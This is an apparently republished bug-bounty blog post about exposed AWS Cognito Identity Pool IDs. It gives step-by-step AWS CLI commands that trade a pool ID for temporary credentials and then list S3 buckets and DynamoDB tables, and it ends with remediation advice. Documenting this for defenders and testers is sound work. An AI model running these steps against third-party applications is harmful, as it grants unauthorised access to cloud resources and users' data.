---
title: "Unauthenticated Access to AWS via Cognito Identity Pool ID"
date: 2026-05-05
tags: ["AWS", "Security", "Cloud Security", "Bug Bounty", "Cognito"]
description: "How an exposed Cognito Identity Pool ID can hand attackers temporary AWS credentials — no login required."
canonicalURL: "https://saurabh-jain.medium.com/unauthenticated-access-to-aws-via-cognito-identity-pool-credentials-dc7fd5e01ec7"
cover: "https://miro.medium.com/v2/resize:fit:1072/1*OqaoatIVKME7GHoLVCC6dw.png"
featured: true
---

> This article was originally published on [Medium](https://saurabh-jain.medium.com/unauthenticated-access-to-aws-via-cognito-identity-pool-credentials-dc7fd5e01ec7). Read the full version there.

## What is Amazon Cognito Identity Pool?

Cognito Identity Pool is a **system that gives temporary AWS access to users**. Key characteristics:

- Authenticated users receive access upon login
- Unauthenticated users can obtain limited access *without logging in*
- Commonly deployed in web applications for logging, data uploads, and backend service calls

When "Enable access to unauthenticated identities" is turned on (the default in many setups), anyone who knows the Identity Pool ID can request temporary AWS credentials — no account needed.

## The Discovery

During penetration testing or bug bounty work, Cognito Identity Pool IDs can surface in:

- HTTP response bodies
- JavaScript source files bundled in the frontend
- Mobile app binaries (after decompilation)
- Browser DevTools network tab

They follow this format:

```
us-east-1:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```

## Attack Flow

### Step 1: Obtain the Identity Pool ID

Search JS source or network requests for the pattern `us-REGION-1:[a-f0-9-]{36}`.

### Step 2: Get Unauthenticated Identity

```bash
aws cognito-identity get-id \
  --identity-pool-id "us-east-1:POOL-ID-HERE" \
  --region us-east-1
```

### Step 3: Exchange for Temporary Credentials

```bash
aws cognito-identity get-credentials-for-identity \
  --identity-id "us-east-1:IDENTITY-ID-FROM-STEP-2" \
  --region us-east-1
```

This returns `AccessKeyId`, `SecretKey`, and `SessionToken` — valid AWS credentials.

### Step 4: Enumerate What's Accessible

```bash
export AWS_ACCESS_KEY_ID="..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Check who you are
aws sts get-caller-identity

# Try common services
aws s3 ls
aws dynamodb list-tables --region us-east-1
```

## Why This Matters

The severity depends entirely on what IAM role is attached to the unauthenticated identity. Common misconfigurations grant:

- Read access to S3 buckets (PII exposure)
- DynamoDB read (user data, configs)
- Pinpoint or analytics write (data poisoning)

In the worst cases, overly permissive roles can lead to full account compromise via privilege escalation chains.

## Remediation

1. **Disable unauthenticated access** if your app doesn't need it (Cognito → Identity Pool → Edit → uncheck "Enable access to unauthenticated identities")
2. **Scope the IAM role** attached to unauthenticated identities to the absolute minimum
3. **Rotate the Identity Pool** if it has been exposed and unauthenticated access was enabled
4. **Treat Identity Pool IDs as semi-sensitive** — don't ship them in public JS bundles unnecessarily
